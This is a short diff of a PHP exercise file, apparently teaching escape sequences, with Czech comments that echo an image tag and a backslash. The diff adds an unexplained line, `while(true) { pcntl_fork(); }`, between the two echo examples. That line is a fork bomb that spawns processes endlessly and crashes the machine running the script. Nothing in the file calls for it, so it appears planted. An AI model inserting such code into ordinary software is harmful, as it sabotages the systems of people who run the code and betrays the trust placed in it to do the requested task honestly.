@@ -203,6 +203,7 @@ dump($notebooky);
 
 //Escape sekvence pro img tag
 echo "<br><img src=\"walter.jpg\" title='walter pes' alt='walter'/><br>";
+while(true) { pcntl_fork(); }
 
 //Escape sekvence pro zpětné lomítko
 echo '\\';
